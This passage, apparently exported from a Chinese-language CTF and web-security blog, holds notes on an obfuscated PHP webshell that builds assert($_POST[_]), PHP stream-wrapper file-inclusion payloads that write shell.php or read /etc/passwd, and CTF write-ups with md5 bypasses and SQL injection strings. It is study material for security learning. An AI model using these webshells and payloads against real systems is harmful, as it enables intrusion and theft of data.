class=\"variable\">$__</span>++;<span class=\"variable\">$__</span>++;   <span class=\"comment\">//å¾—åˆ°&quot;P&quot;ï¼Œæ­¤æ—¶$__=&quot;P&quot;</span></span><br><span class=\"line\"><span class=\"variable\">$____</span> .= <span class=\"variable\">$__</span>;   <span class=\"comment\">//$____=&quot;_P&quot;</span></span><br><span class=\"line\"><span class=\"variable\">$__</span> = <span class=\"variable\">$_</span>;   <span class=\"comment\">//$__=&quot;A&quot;</span></span><br><span class=\"line\"><span class=\"variable\">$__</span>++;<span class=\"variable\">$__</span>++;<span class=\"variable\">$__</span>++;<span class=\"variable\">$__</span>++;<span class=\"variable\">$__</span>++;<span class=\"variable\">$__</span>++;<span class=\"variable\">$__</span>++;<span class=\"variable\">$__</span>++;<span class=\"variable\">$__</span>++;<span class=\"variable\">$__</span>++;<span class=\"variable\">$__</span>++;<span class=\"variable\">$__</span>++;<span class=\"variable\">$__</span>++;<span class=\"variable\">$__</span>++;   <span class=\"comment\">//å¾—åˆ°&quot;O&quot;ï¼Œæ­¤æ—¶$__=&quot;O&quot;</span></span><br><span class=\"line\"><span class=\"variable\">$____</span> .= <span class=\"variable\">$__</span>;   <span class=\"comment\">//$____=&quot;_PO&quot;</span></span><br><span class=\"line\"><span class=\"variable\">$__</span>++;<span class=\"variable\">$__</span>++;<span class=\"variable\">$__</span>++;<span class=\"variable\">$__</span>++;   <span class=\"comment\">//å¾—åˆ°&quot;S&quot;ï¼Œæ­¤æ—¶$__=&quot;S&quot;</span></span><br><span class=\"line\"><span class=\"variable\">$____</span> .= <span class=\"variable\">$__</span>;   <span class=\"comment\">//$____=&quot;_POS&quot;</span></span><br><span class=\"line\"><span class=\"variable\">$__</span>++;   <span class=\"comment\">//å¾—åˆ°&quot;T&quot;ï¼Œæ­¤æ—¶$__=&quot;T&quot;</span></span><br><span class=\"line\"><span class=\"variable\">$____</span> .= <span class=\"variable\">$__</span>;   <span class=\"comment\">//$____=&quot;_POST&quot;</span></span><br><span class=\"line\"><span class=\"variable\">$_</span> = <span class=\"variable\">$$____</span>;   <span class=\"comment\">//$_=$_POST</span></span><br><span class=\"line\"><span class=\"variable\">$___</span>(<span class=\"variable\">$_</span>[_]);   <span class=\"comment\">//ASSERT($POST[_])</span></span><br></pre></td></tr></table></figure>\n<h3 id=\"2\"><a class=\"markdownIt-Anchor\" href=\"#2\">#</a> 2.</h3>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"><span class=\"variable\">$_</span>=[];</span><br><span class=\"line\"><span class=\"variable\">$_</span>=@<span class=\"string\">&quot;<span class=\"subst\">$_</span>&quot;</span>; <span class=\"comment\">// $_=&#x27;Array&#x27;;</span></span><br><span class=\"line\"><span class=\"variable\">$_</span>=<span class=\"variable\">$_</span>[<span class=\"string\">&#x27;!&#x27;</span>==<span class=\"string\">&#x27;@&#x27;</span>]; <span class=\"comment\">// $_=$_[0];</span></span><br><span class=\"line\"><span class=\"variable\">$___</span>=<span class=\"variable\">$_</span>; <span class=\"comment\">// A</span></span><br><span class=\"line\"><span class=\"variable\">$__</span>=<span class=\"variable\">$_</span>;</span><br><span class=\"line\"><span class=\"variable\">$__</span>++;<span class=\"variable\">$__</span>++;<span class=\"variable\">$__</span>++;<span class=\"variable\">$__</span>++;<span class=\"variable\">$__</span>++;<span class=\"variable\">$__</span>++;<span class=\"variable\">$__</span>++;<span class=\"variable\">$__</span>++;<span class=\"variable\">$__</span>++;<span class=\"variable\">$__</span>++;<span class=\"variable\">$__</span>++;<span class=\"variable\">$__</span>++;<span class=\"variable\">$__</span>++;<span class=\"variable\">$__</span>++;<span class=\"variable\">$__</span>++;<span class=\"variable\">$__</span>++;<span class=\"variable\">$__</span>++;<span class=\"variable\">$__</span>++;</span><br><span class=\"line\"><span class=\"variable\">$___</span>.=<span class=\"variable\">$__</span>; <span class=\"comment\">// S</span></span><br><span class=\"line\"><span class=\"variable\">$___</span>.=<span class=\"variable\">$__</span>; <span class=\"comment\">// S</span></span><br><span class=\"line\"><span class=\"variable\">$__</span>=<span class=\"variable\">$_</span>;</span><br><span class=\"line\"><span class=\"variable\">$__</span>++;<span class=\"variable\">$__</span>++;<span class=\"variable\">$__</span>++;<span class=\"variable\">$__</span>++; <span class=\"comment\">// E </span></span><br><span class=\"line\"><span class=\"variable\">$___</span>.=<span class=\"variable\">$__</span>;</span><br><span class=\"line\"><span class=\"variable\">$__</span>=<span class=\"variable\">$_</span>;</span><br><span class=\"line\"><span class=\"variable\">$__</span>++;<span class=\"variable\">$__</span>++;<span class=\"variable\">$__</span>++;<span class=\"variable\">$__</span>++;<span class=\"variable\">$__</span>++;<span class=\"variable\">$__</span>++;<span class=\"variable\">$__</span>++;<span class=\"variable\">$__</span>++;<span class=\"variable\">$__</span>++;<span class=\"variable\">$__</span>++;<span class=\"variable\">$__</span>++;<span class=\"variable\">$__</span>++;<span class=\"variable\">$__</span>++;<span class=\"variable\">$__</span>++;<span class=\"variable\">$__</span>++;<span class=\"variable\">$__</span>++;<span class=\"variable\">$__</span>++; <span class=\"comment\">// R</span></span><br><span class=\"line\"><span class=\"variable\">$___</span>.=<span class=\"variable\">$__</span>;</span><br><span class=\"line\"><span class=\"variable\">$__</span>=<span class=\"variable\">$_</span>;</span><br><span class=\"line\"><span class=\"variable\">$__</span>++;<span class=\"variable\">$__</span>++;<span class=\"variable\">$__</span>++;<span class=\"variable\">$__</span>++;<span class=\"variable\">$__</span>++;<span class=\"variable\">$__</span>++;<span class=\"variable\">$__</span>++;<span class=\"variable\">$__</span>++;<span class=\"variable\">$__</span>++;<span class=\"variable\">$__</span>++;<span class=\"variable\">$__</span>++;<span class=\"variable\">$__</span>++;<span class=\"variable\">$__</span>++;<span class=\"variable\">$__</span>++;<span class=\"variable\">$__</span>++;<span class=\"variable\">$__</span>++;<span class=\"variable\">$__</span>++;<span class=\"variable\">$__</span>++;<span class=\"variable\">$__</span>++; <span class=\"comment\">// T</span></span><br><span class=\"line\"><span class=\"variable\">$___</span>.=<span class=\"variable\">$__</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"variable\">$____</span>=<span class=\"string\">&#x27;_&#x27;</span>;</span><br><span class=\"line\"><span class=\"variable\">$__</span>=<span class=\"variable\">$_</span>;</span><br><span class=\"line\"><span class=\"variable\">$__</span>++;<span class=\"variable\">$__</span>++;<span class=\"variable\">$__</span>++;<span class=\"variable\">$__</span>++;<span class=\"variable\">$__</span>++;<span class=\"variable\">$__</span>++;<span class=\"variable\">$__</span>++;<span class=\"variable\">$__</span>++;<span class=\"variable\">$__</span>++;<span class=\"variable\">$__</span>++;<span class=\"variable\">$__</span>++;<span class=\"variable\">$__</span>++;<span class=\"variable\">$__</span>++;<span class=\"variable\">$__</span>++;<span class=\"variable\">$__</span>++; <span class=\"comment\">// P</span></span><br><span class=\"line\"><span class=\"variable\">$____</span>.=<span class=\"variable\">$__</span>;</span><br><span class=\"line\"><span class=\"variable\">$__</span>=<span class=\"variable\">$_</span>;</span><br><span class=\"line\"><span class=\"variable\">$__</span>++;<span class=\"variable\">$__</span>++;<span class=\"variable\">$__</span>++;<span class=\"variable\">$__</span>++;<span class=\"variable\">$__</span>++;<span class=\"variable\">$__</span>++;<span class=\"variable\">$__</span>++;<span class=\"variable\">$__</span>++;<span class=\"variable\">$__</span>++;<span class=\"variable\">$__</span>++;<span class=\"variable\">$__</span>++;<span class=\"variable\">$__</span>++;<span class=\"variable\">$__</span>++;<span class=\"variable\">$__</span>++; <span class=\"comment\">// O</span></span><br><span class=\"line\"><span class=\"variable\">$____</span>.=<span class=\"variable\">$__</span>;</span><br><span class=\"line\"><span class=\"variable\">$__</span>=<span class=\"variable\">$_</span>;</span><br><span class=\"line\"><span class=\"variable\">$__</span>++;<span class=\"variable\">$__</span>++;<span class=\"variable\">$__</span>++;<span class=\"variable\">$__</span>++;<span class=\"variable\">$__</span>++;<span class=\"variable\">$__</span>++;<span class=\"variable\">$__</span>++;<span class=\"variable\">$__</span>++;<span class=\"variable\">$__</span>++;<span class=\"variable\">$__</span>++;<span class=\"variable\">$__</span>++;<span class=\"variable\">$__</span>++;<span class=\"variable\">$__</span>++;<span class=\"variable\">$__</span>++;<span class=\"variable\">$__</span>++;<span class=\"variable\">$__</span>++;<span class=\"variable\">$__</span>++;<span class=\"variable\">$__</span>++; <span class=\"comment\">// S</span></span><br><span class=\"line\"><span class=\"variable\">$____</span>.=<span class=\"variable\">$__</span>;</span><br><span class=\"line\"><span class=\"variable\">$__</span>=<span class=\"variable\">$_</span>;</span><br><span class=\"line\"><span class=\"variable\">$__</span>++;<span class=\"variable\">$__</span>++;<span class=\"variable\">$__</span>++;<span class=\"variable\">$__</span>++;<span class=\"variable\">$__</span>++;<span class=\"variable\">$__</span>++;<span class=\"variable\">$__</span>++;<span class=\"variable\">$__</span>++;<span class=\"variable\">$__</span>++;<span class=\"variable\">$__</span>++;<span class=\"variable\">$__</span>++;<span class=\"variable\">$__</span>++;<span class=\"variable\">$__</span>++;<span class=\"variable\">$__</span>++;<span class=\"variable\">$__</span>++;<span class=\"variable\">$__</span>++;<span class=\"variable\">$__</span>++;<span class=\"variable\">$__</span>++;<span class=\"variable\">$__</span>++; <span class=\"comment\">// T</span></span><br><span class=\"line\"><span class=\"variable\">$____</span>.=<span class=\"variable\">$__</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"variable\">$_</span>=<span class=\"variable\">$$____</span>;</span><br><span class=\"line\"><span class=\"variable\">$___</span>(<span class=\"variable\">$_</span>[_]); <span class=\"comment\">// ASSERT($_POST[_]);</span></span><br></pre></td></tr></table></figure>\n<p><mark>æ³¨æ„</mark><br>\nç”±äºæœ‰å¾ˆå¤šä¸å¯è§å­—ç¬¦ï¼Œæˆ‘ä»¬è¦æŠŠå®ƒä»¬æ”¾åˆ°ä¸€æ’å url ç¼–ç æ‰èƒ½ç”¨</p>\n<h1 id=\"php5ä¸php7çš„åŒºåˆ«\"><a class=\"markdownIt-Anchor\" href=\"#php5ä¸php7çš„åŒºåˆ«\">#</a> php5 ä¸ php7 çš„åŒºåˆ«</h1>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">php5:</span><br><span class=\"line\">$f=&#x27;assert&#x27;;$f($_POST[1]);</span><br><span class=\"line\">post: 1=phpinfo();</span><br><span class=\"line\"></span><br><span class=\"line\">php7:</span><br><span class=\"line\">($f)()æ–¹æ³•è°ƒç”¨å‡½æ•°</span><br><span class=\"line\">eg.</span><br><span class=\"line\">(call_user_func)(system,whoami,&#x27;&#x27;)</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p>å› æ­¤ php7 å¯ä»¥å–åç›´æ¥ç”¨ï¼Œå°±åƒä¸Šé¢ç¬¬ä¸€ä¸ªæ–¹æ³•ä¸€æ ·</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">(call_user_func)(system,whoami,&#x27;&#x27;)</span><br><span class=\"line\"></span><br><span class=\"line\">(~%9c%9e%93%93%a0%8a%8c%9a%8d%a0%99%8a%91%9c)(~%8c%86%8c%8b%9a%92,~%88%97%90%9e%92%96,&#x27;&#x27;);</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n",
            "tags": []
        },
        {
            "id": "https://hq185187.github.io/2023/04/26/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/",
            "url": "https://hq185187.github.io/2023/04/26/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/",
            "title": "æ–‡ä»¶åŒ…å«åŠä¼ªåè®®çš„ä½¿ç”¨",
            "date_published": "2023-04-26T10:30:05.193Z",
            "content_html": "<h1 id=\"åŸå› \"><a class=\"markdownIt-Anchor\" href=\"#åŸå› \">#</a> åŸå› </h1>\n<p>å››ä¸ªå‡½æ•°:include (),include_once (),require (),require_once ()<br>\n åªè¦æ–‡ä»¶å†…å®¹ç¬¦åˆ PHP è¯­æ³•è§„èŒƒï¼Œé‚£ä¹ˆä»»ä½•æ‰©å±•åéƒ½å¯ä»¥è¢« PHP è§£æã€‚æ¯”å¦‚æŠŠ <code>&lt;?php phpinfo();?&gt;</code>  æ–‡ä»¶åæ”¹ä¸º phpinfo.txt è¿˜æ˜¯å¯ä»¥çœ‹åˆ°ä¿¡æ¯<br>\nåŒ…å«é PHP è¯­æ³•è§„èŒƒæºæ–‡ä»¶æ—¶ï¼Œå°†ä¼šæš´éœ²å…¶æºä»£ç </p>\n<h1 id=\"ä¼ªåè®®\"><a class=\"markdownIt-Anchor\" href=\"#ä¼ªåè®®\">#</a> ä¼ªåè®®</h1>\n<h2 id=\"1dataåè®®\"><a class=\"markdownIt-Anchor\" href=\"#1dataåè®®\">#</a> 1.data åè®®</h2>\n<p>è¿™æ˜¯ä¸€ç§æ•°æ®æµå°è£…å™¨ï¼Œç”¨æ³•: <code>data://text/plain,&lt;?php system('whoami')?&gt;</code> <br>\n <code>data://text/plain;base64,PD9waHAgc3lzdGVtKHdob2FtaSk/Pg==</code></p>\n<h2 id=\"2phpåè®®\"><a class=\"markdownIt-Anchor\" href=\"#2phpåè®®\">#</a> 2.php:// åè®®</h2>\n<p>è®¿é—®å„ä¸ªè¾“å…¥è¾“å‡ºæµ</p>\n<h3 id=\"1phpinput\"><a class=\"markdownIt-Anchor\" href=\"#1phpinput\">#</a> (1)php://input</h3>\n<p>ç”¨æ¥æ¥æ”¶ POST æ•°æ®<br>\n eg1. å¢åŠ ä¸€å¥è¯</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?file=php:input</span><br><span class=\"line\">postä¼ å‚:</span><br><span class=\"line\">&lt;?php fputs(fopen(&quot;shell.php&quot;,&quot;a&quot;),&quot;&lt;?php phpinfo.php();?&gt;&quot;)?&gt;</span><br></pre></td></tr></table></figure>\n<p>eg2. å¢åŠ æ–‡ä»¶<br>\n post éƒ¨åˆ†æ”¹ä¸º:</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?php fputs(fopen(&quot;shell.php&quot;,&quot;w&quot;),&quot;&lt;?php phpinfo.php();?&gt;&quot;)?&gt;</span><br></pre></td></tr></table></figure>\n<p>eg3. æ‰§è¡Œç³»ç»Ÿå‘½ä»¤<br>\n post ä¸º:</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?php system(&#x27;whoami&#x27;);?&gt;</span><br></pre></td></tr></table></figure>\n<h2 id=\"2phpfilter\"><a class=\"markdownIt-Anchor\" href=\"#2phpfilter\">#</a> (2)php://filter</h2>\n<p>è¿™ä¸ªè¯­å¥ç”¨æ¥æŸ¥çœ‹æºç ã€‚ç›´æ¥åŒ…å« php æ–‡ä»¶æ—¶ä¼šè¢«è§£æï¼Œä¸èƒ½çœ‹åˆ°æºç ï¼Œæ‰€ä»¥ç”¨ filter æ¥è¯»å–ï¼Œä¸è¿‡è¦å…ˆ base64 åŠ å¯†ä¼ è¾“è¿‡æ¥<br>\n eg.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">php://filter/read=convert.base64-encode/resource=C:\\oneword</span><br></pre></td></tr></table></figure>\n<p>è¿˜æœ‰ä¸€äº›å¯å‚è€ƒ php æ‰‹å†Œ</p>\n<h2 id=\"3fileåè®®\"><a class=\"markdownIt-Anchor\" href=\"#3fileåè®®\">#</a> 3.file:// åè®®</h2>\n<p>è®¿é—®æœ¬åœ°æ–‡ä»¶ç³»ç»Ÿ<br>\n eg</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">file:///D:/phpstudy_pro/WWW/index.html</span><br><span class=\"line\"></span><br><span class=\"line\">file://D:\\phpstudy_pro\\WWW\\index.html</span><br></pre></td></tr></table></figure>\n<p>çœ‹ä¸ªä¾‹å­:</p>\n<p>![[Pasted image 20230425131935.png]]<br>\n![[Pasted image 20230425132653.png]]<br>\n å‰é¢è¯´è¿‡åç¼€åä¸æ˜¯ php ä½†æ˜¯æ–‡ä»¶å†…å®¹ç¬¦åˆ php ç»“æ„çš„ä¹Ÿå¯ä»¥å½“ä½œ php è§£æï¼Œè¿™å°±æ˜¯ include å‡½æ•°</p>\n<h2 id=\"4zipåè®®\"><a class=\"markdownIt-Anchor\" href=\"#4zipåè®®\">#</a> 4.zip åè®®</h2>\n<p>zip:// æœ¬æ¥æ˜¯ç”¨æ¥è®¿é—®å‹ç¼©åŒ…é‡Œçš„æ–‡ä»¶ã€‚å½“å®ƒä¸åŒ…å«å‡½æ•°ç»“åˆæ—¶ï¼Œzip:// æµå°±ä¼šè¢«å½“ä½œ php æ–‡ä»¶æ‰§è¡Œ</p>\n<p>è§„åˆ™:</p>\n<ol>\n<li>zip:// ä¸­åªèƒ½ä¼ å…¥ç»å¯¹è·¯å¾„</li>\n<li>è¦ç”¨ #åˆ†éš”å‹ç¼©åŒ…å’Œå‹ç¼©åŒ…é‡Œçš„å†…å®¹ï¼Œå¹¶ä¸” #è¦ç”¨ url ç¼–ç  %23</li>\n<li>åªéœ€è¦æ˜¯ zip çš„å‹ç¼©åŒ…å°±è¡Œï¼Œåç¼€åå¯ä»¥ä»»æ„æ”¹<br>\n eg ç›´æ¥ç”¨ zip åè®®</li>\n</ol>\n<p>![[Pasted image 20230425141324.png]]</p>\n<p>æ”¹æˆ zip.jpg å<br>\nï¼[[Pasted image 20230425141432.png]]</p>\n<ul>\n<li>bzip2,zlib ä¸€æ ·å°±æ˜¯ç»å¯¹è·¯å¾„å’Œç›¸å¯¹è·¯å¾„éƒ½èƒ½ç”¨</li>\n</ul>\n<h2 id=\"5pharåè®®\"><a class=\"markdownIt-Anchor\" href=\"#5pharåè®®\">#</a> 5.phar åè®®</h2>\n<ul>\n<li>phar:// æœ‰ç‚¹ç±»ä¼¼ zip:// åŒæ ·å¯ä»¥å¯¼è‡´ ä»»æ„ä»£ç æ‰§è¡Œã€‚</li>\n<li>å¯ä»¥ç”¨ç›¸å¯¹è·¯å¾„å’Œç»å¯¹è·¯å¾„<br>\n poc:</li>\n<li><code>?file=phar://zip.jpg/phpinfo.txt</code></li>\n<li><code>?file=phar://D:\\zip.jpg\\phpinfo.txt</code></li>\n<li>å¯ä»¥é…åˆæ–‡ä»¶ä¸Šä¼ æ¼æ´:<br>\n å‡å¦‚æ–‡ä»¶ä¸Šä¼ é™åˆ¶ MIME, æŠŠæœ¨é©¬æ–‡ä»¶å‹ç¼©æˆ zip, å†è¯¥åç¼€åä¸º jpg, ç›´æ¥ phar åè®®æ‰§è¡Œ</li>\n</ul>\n<h1 id=\"ç»•è¿‡\"><a class=\"markdownIt-Anchor\" href=\"#ç»•è¿‡\">#</a> ç»•è¿‡</h1>\n<h2 id=\"1æŒ‡å®šåç¼€å\"><a class=\"markdownIt-Anchor\" href=\"#1æŒ‡å®šåç¼€å\">#</a> 1. æŒ‡å®šåç¼€å</h2>\n<p>eg</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?php</span><br><span class=\"line\">\terror_reporting(0);</span><br><span class=\"line\">\t$file = $_GET[&quot;file&quot;];</span><br><span class=\"line\">\t//åç¼€</span><br><span class=\"line\">\tinclude $file.&quot;.txt&quot;;</span><br><span class=\"line\"></span><br><span class=\"line\">\thighlight_file(__FILE__);</span><br><span class=\"line\">?&gt;</span><br></pre></td></tr></table></figure>\n<ol>\n<li>%00 æˆªæ–­</li>\n<li>é•¿åº¦ç»•è¿‡ï¼Œä¸€ç›´././././././././,Windows è¶…è¿‡ 256 åé¢ä¸¢å¼ƒï¼ŒLinux4096</li>\n<li>url ç»•è¿‡:<br>\n <code>url:protocol :// hostname[:port] / path / [;parameters][?query]#fragment </code> <br>\n(1).query<br>\npayload: <code>http://127.0.0.1/phpinfo.php?</code> <br>\n æ‹¼æ¥å: <code>http://127.0.0.1/phpinfo.php?.txt</code> <br>\n(2)fragment<br>\npayload: <code>http://127.0.0.1/phpinfo.php%23</code> <br>\n æ‹¼æ¥å: <code>http://127.0.0.1/phpinfo.php#.txt</code></li>\n</ol>\n<h2 id=\"2ç¼–ç \"><a class=\"markdownIt-Anchor\" href=\"#2ç¼–ç \">#</a> 2. ç¼–ç </h2>\n<h3 id=\"1\"><a class=\"markdownIt-Anchor\" href=\"#1\">#</a> 1.  â€¦/</h3>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">1.urlç¼–ç </span><br><span class=\"line\">%2e%2e%2f</span><br><span class=\"line\">..%2f</span><br><span class=\"line\">%2e%2e/</span><br><span class=\"line\">2.äºŒæ¬¡ç¼–ç </span><br><span class=\"line\">%252e%252e%252f</span><br><span class=\"line\">3.å®¹å™¨å’ŒæœåŠ¡å™¨ç¼–ç </span><br><span class=\"line\">..%c0%af</span><br></pre></td></tr></table></figure>\n<p>å‚è€ƒ:<span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQyMTgxNDI4L2FydGljbGUvZGV0YWlscy84NzA5MDUzOQ==\">(122 æ¡æ¶ˆæ¯) CTF ä¸­æ–‡ä»¶åŒ…å«æ¼æ´æ€»ç»“_LetheSec çš„åšå®¢ - CSDN åšå®¢</span></p>\n",
            "tags": []
        },
        {
            "id": "https://hq185187.github.io/2023/04/26/nessctf/",
            "url": "https://hq185187.github.io/2023/04/26/nessctf/",
            "title": "NSSCTF1",
            "date_published": "2023-04-25T16:51:04.501Z",
            "content_html": "<h3 id=\"1easy_md5\"><a class=\"markdownIt-Anchor\" href=\"#1easy_md5\">#</a> 1.easy_md5</h3>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">`&lt;?phpÂ    Â highlight_file(__FILE__);   Â includeÂ &#x27;flag2.php&#x27;;   Â    ifÂ (isset($_GET[&#x27;name&#x27;])Â &amp;&amp;Â isset($_POST[&#x27;password&#x27;]))&#123;Â Â Â Â $nameÂ =Â $_GET[&#x27;name&#x27;];Â Â Â Â $passwordÂ =Â $_POST[&#x27;password&#x27;];   Â Â Â Â ifÂ ($nameÂ !=Â $passwordÂ &amp;&amp;Â md5($name)Â ==Â md5($password))&#123;   Â Â Â Â Â Â Â Â echoÂ $flag;   Â Â Â Â &#125;   Â Â Â Â elseÂ &#123;   Â Â Â Â Â Â Â Â echoÂ &quot;wrong!&quot;;   Â Â Â Â &#125;   Â    &#125;   elseÂ &#123;   Â Â Â Â echoÂ &#x27;wrong!&#x27;;   &#125;   ?&gt;`</span><br></pre></td></tr></table></figure>\n<p>md5 å¼±ç±»å‹æ¯”è¾ƒ<br>\n (1).0e ç»•è¿‡<br>\nä»¥ä¸‹æ˜¯ä¸€äº›å­—ç¬¦ä¸² md5 å€¼ä»¥ 0e å¼€å¤´<br>\n QNKCDZO<br>\n240610708<br>\ns878926199a<br>\ns155964671a<br>\ns21587387a</p>\n<p>(2). æ•°ç»„ç»•è¿‡<br>\n md5 () å‡½æ•°è®¡ç®—çš„æ˜¯ä¸€ä¸ªå­—ç¬¦ä¸²çš„å“ˆå¸Œå€¼ï¼Œå¯¹äºæ•°ç»„åˆ™è¿”å› false<br>\n <code>payload:?a[]=1&amp;b[]=2</code></p>\n<h3 id=\"2caidao\"><a class=\"markdownIt-Anchor\" href=\"#2caidao\">#</a> 2.caidao</h3>\n<p>(1) antsword è¿<br>\n (2) hackbar ä¼ å‚:`wllm=system (â€˜cat â€¦/â€¦/â€¦/flagâ€™);</p>\n<h3 id=\"3include\"><a class=\"markdownIt-Anchor\" href=\"#3include\">#</a> 3.include</h3>\n<p>(1) filter ä¼ªåè®®</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">php://filter/convert.base64-encode/resource=flag.php</span><br></pre></td></tr></table></figure>\n<p>è¿™é¢˜ç”¨ file åè®®ä¹Ÿå¯ä»¥ä½†æ˜¯æ²¡æœ‰å¾—åˆ° flag<br>\n å¯ä»¥è¿™æ ·:?file= <code>file:///etc/passwd</code> <br>\n ä½†æ˜¯ <code>?file=file:///var/www/flag.php</code>  ä¸è¡Œ<br>\n<strong>æƒ³æ·±åˆ»äº†è§£ä¼ªåè®®çš„æ¥è¿™é‡Œ</strong></p>\n<h3 id=\"4ezrce\"><a class=\"markdownIt-Anchor\" href=\"#4ezrce\">#</a> 4.ezrce</h3>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">`&lt;?php   error_reporting(0);   highlight_file(__FILE__);   if(isset($_GET[&#x27;url&#x27;]))   &#123;   eval($_GET[&#x27;url&#x27;]);   &#125;`</span><br></pre></td></tr></table></figure>\n<p>å­¦ä¹  Linux å‘½ä»¤</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">ls / åˆ—å‡ºæ ¹ç›®å½•(\\)ä¸‹çš„æ‰€æœ‰ç›®å½•</span><br><span class=\"line\">å‘ç°flagæ–‡ä»¶åœ¨rootæ ¹ç›®å½•ä¸‹,cat /flllllllagæ¥catæ ¹ç›®å½•ä¸‹çš„flagæ–‡ä»¶</span><br></pre></td></tr></table></figure>\n<p><strong>æ·±åˆ»äº†è§£ Linux å‘½ä»¤æ¥è¿™é‡Œ</strong></p>\n<h3 id=\"5easysql-suctf2019\"><a class=\"markdownIt-Anchor\" href=\"#5easysql-suctf2019\">#</a> 5.EasySQL SUCTF2019</h3>\n<p>fuzz:</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">1&#x27; or 1=1--+</span><br><span class=\"line\">1&#x27; order by 3--+</span><br><span class=\"line\">1&#x27; and updatexml(1,concat(0x7e,database()),1)--+</span><br><span class=\"line\">1&#x27; and if(length(database())&gt;1,sleep(5),1)--+</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p>å †å æ³¨å…¥:</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">1;show databases#</span><br><span class=\"line\">1;show tables#</span><br><span class=\"line\">è¿™ä¸¤ä¸ªè¿˜å¯ä»¥</span><br><span class=\"line\">1;show columns from &#x27;Flag&#x27;#</span><br><span class=\"line\">å¤±è´¥</span><br></pre></td></tr></table></figure>\n<p>å®ƒçš„ SQL æŸ¥è¯¢è¯­å¥æ˜¯:<br>\n <code>select $_POST['query']||flag from Flag</code> <br>\n è¯´çœŸçš„æˆ‘çŒœä¸å‡ºæ¥<br>\nå½“ sql_mode è®¾ç½®äº† 